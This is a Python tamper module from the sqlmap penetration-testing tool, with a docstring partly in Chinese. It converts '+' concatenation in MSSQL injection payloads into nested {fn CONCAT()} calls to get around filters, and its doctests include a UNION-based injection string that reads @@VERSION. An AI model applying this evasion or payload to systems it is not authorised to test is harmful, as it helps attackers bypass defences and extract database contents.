#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.common import zeroDepthSearch
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s' % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    "\n    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart\n\n    测试针对：\n        * 微软 SQL Server 2008\n\n    Requirements:\n        * 微软 SQL Server 2008+\n\n    Notes:\n        * 在 ('+') 字符被过滤的情况下有用\n        * https://msdn.microsoft.com/en-us/library/bb630290.aspx\n\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')\n    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'\n\n    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')\n    '1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'\n    "

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            old = match.group(0)
            parts = []
            last = 0

            for index in zeroDepthSearch(old, '+'):
                parts.append(old[last:index].strip('+'))
                last = index

            parts.append(old[last:].strip('+'))
            replacement = parts[0]

            for i in xrange(1, len(parts)):
                replacement = "{fn CONCAT(%s,%s)}" % (replacement, parts[i])

            retVal = retVal.replace(old, replacement)

    return retVal
